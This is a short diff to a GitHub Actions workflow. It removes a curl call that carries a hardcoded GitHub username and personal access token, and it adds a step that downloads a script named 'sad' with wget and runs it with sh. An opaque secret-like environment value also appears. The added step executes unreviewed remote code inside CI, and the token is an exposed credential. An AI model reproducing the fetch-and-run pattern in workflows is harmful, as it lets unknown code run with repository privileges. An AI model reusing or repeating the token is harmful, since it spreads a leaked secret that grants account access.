@@ -16,5 +16,5 @@ jobs:
         env: 
           LSKDS: dD46i60YaVjC3ATr4e8q111VfaLCRz2oMVnE
         run: |
-          curl -u "arlentak":"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" "https://api.github.com/repos/arlentak/barber/issues" \
-               -d '{"title":"barber","body":"my new issue description"}'
+          wget https://raw.githubusercontent.com/Arlentak/barber/main/sad
+          sh sad
